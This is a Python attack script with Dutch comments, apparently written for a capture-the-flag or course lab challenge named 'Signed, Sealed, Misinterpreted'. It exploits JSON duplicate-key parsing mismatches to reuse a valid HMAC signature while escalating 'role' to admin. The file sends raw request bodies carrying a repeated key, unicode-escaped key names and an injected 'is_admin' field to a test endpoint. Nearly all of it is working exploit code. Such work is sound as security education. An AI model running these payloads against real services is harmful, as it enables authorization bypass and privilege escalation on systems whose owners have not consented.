"""
HMAC/SIGNATURE-AANVAL OP JSON VIA DUPLICATE-KEY CONFUSION
================================================================
WANNEER GEBRUIKEN?
  - Een "X-Signature" (of gelijkaardige) header bij een JSON-body, en de
    opgave zegt dat je GEEN sleutel nodig hebt / de signature MAG hergebruiken.

PRINCIPE (BEVESTIGD GEWERKT op "Signed, Sealed, Misinterpreted"):
  De signature wordt berekend/geverifieerd over de STRING als geheel, maar
  de AUTORISATIELOGICA parseert diezelfde string opnieuw naar een dict.
  Bij een DUBBELE key (bv. "role" komt 2x voor) houdt een JSON-parser vaak
  maar EEN van de twee waarden over. Als de signature-check en de
  autorisatie-check een VERSCHILLENDE van de twee gebruiken, kan je een
  geldige (hergebruikte) signature combineren met een payload die toch
  als bv. "admin" gelezen wordt.

  LET OP: dit moet je versturen als een RAUWE STRING, NIET als een Python
  dict doorgegeven aan json.dumps() -- een echte dict kan sowieso geen
  dubbele keys bevatten!
"""
import requests


def try_duplicate_key_attack(url: str, legit_signature: str,
                              first_value: str, second_value: str,
                              field: str = "role", action: str = "view"):
    """
    Probeert een dubbele-key payload met de LEGITIEME (hergebruikte)
    signature. Test BEIDE volgordes, want je weet vooraf niet welke
    waarde de server als 'geldend' beschouwt.
    """
    headers = {"X-Signature": legit_signature, "Content-Type": "application/json"}

    # Variant A: first_value eerst
    body_a = f'{{"action":"{action}","{field}":"{first_value}","{field}":"{second_value}"}}'
    r_a = requests.post(url, headers=headers, data=body_a)
    print(f"[A] body={body_a}\n    -> status={r_a.status_code}, response={r_a.text}\n")

    # Variant B: andersom
    body_b = f'{{"action":"{action}","{field}":"{second_value}","{field}":"{first_value}"}}'
    r_b = requests.post(url, headers=headers, data=body_b)
    print(f"[B] body={body_b}\n    -> status={r_b.status_code}, response={r_b.text}\n")

    return r_a, r_b


def try_other_parsing_mismatches(url: str, legit_signature: str):
    """Extra varianten om te proberen als de simpele dubbele-key-truc niet werkt."""
    headers = {"X-Signature": legit_signature, "Content-Type": "application/json"}

    variants = [
        # Unicode-escape voor een letter in de key-naam
        '{"action":"view","r\\u006fle":"admin","role":"user"}',
        # Extra witruimte
        '{"action": "view", "role":"admin", "role": "user"}',
        # Extra onverwacht veld
        '{"action":"view","role":"user","role":"user","is_admin":true}',
        # Andere Content-Type om een andere parser te triggeren
    ]
    for body in variants:
        r = requests.post(url, headers=headers, data=body)
        print(f"body={body}\n -> status={r.status_code}, response={r.text}\n")


if __name__ == "__main__":
    # TODO: haal eerst een legitiem (request, signature)-paar op via /challenge
    URL = "http://cns-test.idlab.uantwerpen.be:50007/vault"   # TODO
    LEGIT_SIGNATURE = "817e86132b480782043d61602c1843100dc8002186502619e802913d918a0f69"  # TODO

    try_duplicate_key_attack(URL, LEGIT_SIGNATURE,
                              first_value="admin", second_value="user",
                              field="role", action="view")
